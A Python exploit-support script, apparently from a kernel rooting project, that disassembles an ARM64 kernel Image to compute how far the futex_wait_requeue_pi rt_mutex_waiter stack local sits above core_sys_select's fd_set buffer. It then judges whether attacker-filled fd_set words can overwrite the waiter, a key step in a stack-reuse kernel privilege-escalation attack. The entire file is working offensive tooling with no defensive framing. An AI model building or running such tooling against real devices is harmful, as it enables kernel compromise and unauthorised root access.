#!/usr/bin/env python3
"""Port of ghostlock-app's tools/extract_rs derive_pselect_layout().

Derives PSELECT_WAITER_WORD_SHIFT by disassembling the pselect and futex
syscall chains in the target kernel Image and measuring how far the
rt_mutex_waiter stack local in futex_wait_requeue_pi sits above the fd_set
stack buffer in core_sys_select.

Usage: derive_pselect.py <Image> <symbols.json> [route_nfds]
"""
import json
import re
import struct
import sys

import capstone

IMAGE = sys.argv[1] if len(sys.argv) > 1 else "Image"
SYMS = sys.argv[2] if len(sys.argv) > 2 else "symbols.json"
ROUTE_NFDS = int(sys.argv[3]) if len(sys.argv) > 3 else 320
OBJDUMP_CAP = 0x2000

data = open(IMAGE, "rb").read()
syms = {k: int(v, 16) for k, v in json.load(open(SYMS)).items()}
BASE = 0xFFFFFFC008000000
offs = {k: v - BASE for k, v in syms.items()}
sorted_offsets = sorted(offs.values())

# BTF-derived rt_mutex_waiter field offsets (from btf_offsets.py on this Image)
PI_TREE_ENTRY = 0x18
WAKE_STATE = 0x40
PI_TREE_NAME = "pi_tree_entry"

md = capstone.Cs(capstone.CS_ARCH_ARM64, capstone.CS_MODE_LITTLE_ENDIAN)
md.detail = True


def u(n):
    if n not in offs:
        return None
    return offs[n]


def unique(n):
    o = u(n)
    if o is None:
        sys.exit(f"FATAL: symbol {n} not found")
    return o


def disasm(name):
    start = unique(name)
    higher = next((o for o in sorted_offsets if o > start), start + OBJDUMP_CAP)
    stop = min(start + OBJDUMP_CAP, higher)
    out = []
    for insn in md.disasm(data[start:stop], start):
        out.append(f"0x{insn.address:x}:\t{insn.mnemonic}\t{insn.op_str}")
    return out


def first_sp_frame(lines, name):
    pre = re.compile(r"(?i)\bstp\s+x29,\s*x30,\s*\[sp,\s*#-0x([0-9a-f]+)\]!")
    sub = re.compile(r"(?i)\bsub\s+sp,\s*sp,\s*#0x([0-9a-f]+)")
    total = 0
    sub_seen = False
    for line in lines:
        m = pre.search(line)
        if m:
            total += int(m.group(1), 16)
        if not sub_seen:
            m = sub.search(line)
            if m:
                total += int(m.group(1), 16)
                sub_seen = True
    if total == 0:
        sys.exit(f"FATAL: {name} has no explicit stack frame")
    return total


def add_sp_immediates(lines):
    rex = re.compile(r"(?i)\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)")
    out = []
    for line in lines:
        for m in rex.finditer(line):
            out.append((m.group(1).lower(), int(m.group(2), 16)))
    return out


def cmp_immediates(lines):
    rex = re.compile(r"(?i)\bcmp\s+x\d+,\s*#0x([0-9a-f]+)")
    return [int(m.group(1), 16) for line in lines for m in rex.finditer(line)]


def has_direct_call(lines, target):
    rx = re.compile(rf"(?i)\bbl\s+#?0x{target:x}\b")
    return any(rx.search(l) for l in lines)


def frame_live_at(lines, anchor_re, ctx):
    """Reject kernels whose function epilogue runs before the anchor."""
    found = False
    for i, l in enumerate(lines):
        if anchor_re.search(l):
            found = True
            for tail in lines[i:]:
                if re.search(r"(?i)\bldp\s+x29,\s*x30,\s*\[sp\],\s*#0x", tail):
                    sys.exit(f"FATAL: {ctx}: frame torn down after anchor")
    return found


print(f"=== derive_pselect_layout (route_nfds={ROUTE_NFDS}) ===")

names = {
    "pselect_wrapper": "__arm64_sys_pselect6",
    "pselect_core": "core_sys_select",
    "futex_wrapper": "__arm64_sys_futex",
    "futex_dispatch": "do_futex",
    "futex_wait": "futex_wait_requeue_pi",
}
dis = {k: disasm(v) for k, v in names.items()}
for k, v in dis.items():
    print(f"  disasm {names[k]:26s} {len(v)} instructions")

# --- pselect chain ---
core = unique("core_sys_select")
chain = ["pselect_wrapper"]
if has_direct_call(dis["pselect_wrapper"], core):
    print("  pselect: direct wrapper -> core_sys_select")
elif u("do_pselect") is not None:
    disp = unique("do_pselect")
    if not has_direct_call(dis["pselect_wrapper"], disp):
        sys.exit("FATAL: wrapper calls neither core_sys_select nor do_pselect")
    if not has_direct_call(disasm("do_pselect"), core):
        sys.exit("FATAL: do_pselect does not call core_sys_select")
    dis["pselect_dispatch"] = disasm("do_pselect")
    names["pselect_dispatch"] = "do_pselect"
    chain.append("pselect_dispatch")
    print("  pselect: wrapper -> do_pselect -> core_sys_select")
else:
    sys.exit("FATAL: wrapper calls neither core_sys_select nor do_pselect")
chain.append("pselect_core")

# --- futex chain ---
fw = unique("futex_wait_requeue_pi")
chainf = ["futex_wrapper"]
if has_direct_call(dis["futex_wrapper"], fw):
    print("  futex: direct wrapper -> futex_wait_requeue_pi")
elif has_direct_call(dis["futex_wrapper"], unique("do_futex")):
    if not has_direct_call(dis["futex_dispatch"], fw):
        sys.exit("FATAL: do_futex does not call futex_wait_requeue_pi")
    chainf.append("futex_dispatch")
    print("  futex: wrapper -> do_futex -> futex_wait_requeue_pi")
else:
    sys.exit("FATAL: futex wrapper calls neither do_futex nor futex_wait_requeue_pi")
chainf.append("futex_wait")

# --- frame checks ---
for c1, c2 in zip(chain, chain[1:]):
    tgt = unique(names[c2])
    if not frame_live_at(dis[c1], re.compile(rf"(?i)\bbl\s+#?0x{tgt:x}\b"), names[c1]):
        sys.exit(f"FATAL: {names[c1]} does not call {names[c2]}")
for c1, c2 in zip(chainf, chainf[1:]):
    tgt = unique(names[c2])
    if not frame_live_at(dis[c1], re.compile(rf"(?i)\bbl\s+#?0x{tgt:x}\b"), names[c1]):
        sys.exit(f"FATAL: {names[c1]} does not call {names[c2]}")

frames = {k: first_sp_frame(dis[k], names[k]) for k in chain + chainf}
for k, v in frames.items():
    print(f"  frame {names[k]:26s} 0x{v:x}")

# --- futex waiter stack local ---
cands = []
for reg, imm in add_sp_immediates(dis["futex_wait"]):
    rx = re.compile(rf"(?i)\badd\s+x\d+,\s*{reg},\s*#0x{PI_TREE_ENTRY:x}\b")
    if any(rx.search(l) for l in dis["futex_wait"]):
        cands.append((reg, imm))
seen = set()
cands = [(r, i) for r, i in cands if not (i in seen or seen.add(i))]
print(f"  waiter candidates: {[(r, hex(i)) for r, i in cands]}")
if len(cands) != 1:
    sys.exit("FATAL: futex waiter stack local not unique")
waiter_reg, waiter_local = cands[0]
anchor = re.compile(rf"(?i)\badd\s+{waiter_reg},\s*sp,\s*#0x{waiter_local:x}\b")
if not frame_live_at(dis["futex_wait"], anchor, "futex_wait"):
    sys.exit("FATAL: waiter anchor not live")

for req in ([waiter_local, waiter_local + WAKE_STATE] if WAKE_STATE else [waiter_local]):
    rx = re.compile(rf"(?i)\[sp,\s*#0x{req:x}\]")
    if not any(rx.search(l) for l in dis["futex_wait"]):
        sys.exit(f"FATAL: waiter field {hex(req)} not cross-validated")
print(f"  waiter_local = {waiter_local:#x} (reg {waiter_reg}), wake_state +{WAKE_STATE:#x} OK")

# --- pselect fd_set buffer local ---
add_sp = add_sp_immediates(dis["pselect_core"])
buf_cands = set()
for reg, imm in add_sp:
    peers = [p for p, pi in add_sp if pi == imm and p != reg]
    for peer in peers:
        if any(re.search(rf"(?i)\bcmp\s+{reg},\s*{peer}\b", l) or
               re.search(rf"(?i)\bcmp\s+{peer},\s*{reg}\b", l)
               for l in dis["pselect_core"]):
            buf_cands.add(imm)
            break
print(f"  fd_set buffer candidates: {[hex(v) for v in sorted(buf_cands)]}")
if len(buf_cands) != 1:
    sys.exit("FATAL: core_sys_select fd_set buffer candidates not unique")
pselect_buffer = buf_cands.pop()

buf_regs = sorted({r for r, i in add_sp if i == pselect_buffer})
print(f"  buffer_regs: {buf_regs}")
for br in buf_regs:
    a = re.compile(rf"(?i)\badd\s+{br},\s*sp,\s*#0x{pselect_buffer:x}\b")
    if not frame_live_at(dis["pselect_core"], a, f"core_sys_select/{br}"):
        sys.exit(f"FATAL: buffer anchor {br} not live")

fds_bytes = ((ROUTE_NFDS + 63) // 64) * 8
ths = cmp_immediates(dis["pselect_core"])
ok = any(fds_bytes < t <= fds_bytes + 8 for t in ths)
print(f"  fds_bytes={fds_bytes}; cmp immediates near: "
      f"{[hex(t) for t in ths if fds_bytes - 8 <= t <= fds_bytes + 16]}")
if not ok:
    sys.exit(f"FATAL: no cmp immediate in ({fds_bytes}, {fds_bytes+8}] — "
             f"route_nfds={ROUTE_NFDS} may not use the stack fd_set path")

# --- compute shift ---
frame_sum = sum(frames[k] for k in chain)
pselect_word0 = -frame_sum + pselect_buffer
futex_sum = sum(frames[k] for k in chainf)
futex_waiter = -futex_sum + waiter_local
delta = futex_waiter - pselect_word0
print()
print(f"  pselect chain: {' -> '.join(names[k] for k in chain)}")
print(f"  futex   chain: {' -> '.join(names[k] for k in chainf)}")
print(f"  frame_sum(pselect)=0x{frame_sum:x}  pselect_word0={pselect_word0:+#x}")
print(f"  frame_sum(futex)=0x{futex_sum:x}    futex_waiter ={futex_waiter:+#x}")
print(f"  delta = {delta} (0x{delta:x})")
if delta < 0 or delta % 8:
    sys.exit(f"FATAL: overlap is not a non-negative qword: {delta}")
shift = delta // 8
print()
print(f"  ==> PSELECT_WAITER_WORD_SHIFT = {shift}")
if shift > 3:
    print(f"  !! shift {shift} > 3: INFEASIBLE for select_stack route "
          f"(fd_set words 0..14 control only shift<=3)")
else:
    print(f"  ==> FEASIBLE (<=3)")
